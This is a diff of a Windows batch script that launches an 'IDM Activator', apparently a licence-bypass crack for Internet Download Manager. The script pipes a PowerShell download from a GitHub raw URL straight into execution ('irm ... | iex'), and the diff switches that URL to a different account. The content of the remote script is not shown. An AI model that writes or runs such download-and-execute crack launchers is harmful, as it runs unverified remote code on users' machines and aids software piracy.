@@ -14,7 +14,7 @@ echo Downloading and running the latest IDM Activator...
 echo.
 
 :: PowerShell command to download and execute the script
-powershell -Command " irm https://raw.githubusercontent.com/its-anya/IDM-Activator/refs/heads/main/install.ps1 | iex"
+powershell -Command " irm https://raw.githubusercontent.com/iemabdullah/IDM-Activator/refs/heads/main/install.ps1 | iex"
 
 echo.
 echo ==================================================
@@ -23,4 +23,5 @@ echo ==================================================
 echo.
 echo Press any key to exit...
 pause >nul
+
 exit
